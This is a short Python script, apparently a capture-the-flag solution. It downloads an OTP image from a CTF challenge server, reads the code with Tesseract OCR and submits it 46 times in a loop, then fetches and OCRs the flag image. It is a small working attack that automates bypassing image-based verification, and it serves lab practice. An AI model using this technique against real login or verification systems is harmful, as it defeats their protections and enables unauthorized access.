#!/usr/bin/env python3

from PIL import Image
import cv2
import pytesseract
import os
import requests

pytesseract.pytesseract.tesseract_cmd = 'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'
# pytesseract.pytesseract.tesseract_cmd = r'C:\Users\USER\AppData\Local\Tesseract-OCR\tesseract.exe'
ses = requests.session()

url = 'http://challenge.ctf.games:32125/'
for i in range(46):
	r = requests.get(url+"static/otp.png", allow_redirects=True)
	
	open('otp.png', 'wb').write(r.content)

	img = cv2.imread('otp.png')

	text = pytesseract.image_to_string(img)
	text = text.split("\n")

	print (text[0])

	data = {
		"otp_entry":text[0]
	}
	out = requests.post(url,data=data)

	print (out.text)

r = requests.get(url+"static/flag.png", allow_redirects=True)
open('flag.png', 'wb').write(r.content)
img = cv2.imread('flag.png')
text = pytesseract.image_to_string(img)
text = text.split("\n")
print (text)